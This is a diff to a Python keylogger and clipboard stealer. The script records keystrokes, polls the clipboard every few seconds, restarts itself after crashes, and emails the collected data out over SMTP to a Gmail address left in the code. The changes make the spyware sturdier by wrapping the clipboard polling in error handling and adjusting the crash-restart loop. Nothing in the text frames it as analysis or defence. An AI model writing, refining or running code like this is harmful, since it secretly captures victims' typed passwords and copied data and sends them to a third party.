@@ -1,8 +1,8 @@
 import os
-from pickle import FALSE
-from platform import platform
+# from pickle import FALSE
+# from platform import platform
 import time
-from click import File
+# from click import File
 import keyboard # for keylogs
 import smtplib
 from email.mime.image import MIMEImage
@@ -13,7 +13,7 @@ from email.header import Header
 from threading import Timer
 from datetime import datetime
 import getpass
-from pip import main
+# from pip import main
 import pyperclip
 import pyautogui
 import ctypes
@@ -30,7 +30,7 @@ def start_script():
         handle_crash()
 
 def handle_crash():
-    time.sleep(3)  # Restarts the script after 2 seconds
+    time.sleep(5) 
     start_script()
 
     
@@ -55,11 +55,14 @@ if not os.path.exists('datafile.txt'):
 
 def clipboard_listener():
     global temp_data, clipboard_data
-    # print(temp_data)
-    if temp_data != pyperclip.paste():
-        temp_data = pyperclip.paste()
-        clipboard_data += f'\n\n{pyperclip.paste()}'
-        print(f'clipboard data: {clipboard_data}')
+    try:
+        if temp_data != pyperclip.paste():
+            temp_data = pyperclip.paste()
+            clipboard_data += f'\n\n{pyperclip.paste()}'
+            # print(f'clipboard data: {clipboard_data}')
+    except:
+        time.sleep(2)
+        clipboard_listener()
     mytimer = Timer(interval=5, function = clipboard_listener)
     mytimer.daemon = True
     mytimer.start()      
@@ -158,8 +161,7 @@ def main_func():
                 print(self.log, file=f)
             print(f"[+] Saved {self.filename}.txt")
 
-        def sendmail(self, email, password, message):
-            
+        def sendmail(self, email, password, message):            
             global clipboard_data
             if not os.path.exists(os.path.join('C://', 'temp')):
                 os.mkdir(os.path.join('C://', 'temp'))
@@ -175,6 +177,7 @@ def main_func():
             # msg["To"] = 'core.builder11@gmail.com'
             # Anshumankumar7890@gmail.com
             clip_data = clipboard_data
+            print(f'clip_data :{clip_data}')
             # with open('clipboard.txt', 'r+') as clip: 
             #     clip_data = clip.read()           
             #     clip.truncate(0)
